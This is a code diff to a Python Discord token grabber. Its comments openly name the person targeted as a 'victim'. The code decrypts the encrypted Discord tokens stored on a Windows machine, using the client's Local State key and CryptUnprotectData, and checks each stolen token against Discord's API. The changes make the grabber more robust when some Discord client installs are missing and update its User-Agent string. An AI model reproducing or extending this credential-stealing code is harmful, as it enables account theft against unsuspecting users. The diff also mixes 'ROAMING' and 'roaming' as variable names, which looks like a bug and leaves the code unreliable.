@@ -13,7 +13,7 @@ import os
 import json 
 import base64
 from re import findall
-from Cryptodome.Cipher import AES # New import 1, AES
+from Cryptodome.Cipher import AES # New import 1, AES / also works with from Crypto.Cipher import AES, remember crypto and cryptodrome are pretty same module
 from win32crypt import CryptUnprotectData # New import 2, win32crypt
 
 appdata = os.getenv("localappdata")
@@ -25,7 +25,7 @@ encrypted_regex = r"dQw4w9WgXcQ:[^\"]*" # encrypted token regex
 def getheaders(token=None, content_type="application/json"): # simply getting our headers for token validation
     headers = {
         "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36" # one of the last agents just in case discord wants to break balls
     }
     if token:
         headers.update({"Authorization": token})
@@ -125,13 +125,14 @@ def grabTokens():
                     continue
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
                     for y in findall(encrypted_regex, line): # and find our encrypted regex
-                        for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs
-                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
-                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
-                            if r.status_code == 200:
-                                if token in tokens:
-                                    continue
-                                tokens.append(token)
+                        for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs, because all local state files are same for an user, even the discord client is different
+                            if os.path.isfile(ROAMING+ f'\\{i}\\Local State'): # to avoid error if victim doesn't hav discordcanary for example (file not found..)
+                                token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
+                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
+                                if r.status_code == 200:
+                                    if token in tokens:
+                                        continue
+                                    tokens.append(token)
                                                     
 
 ```
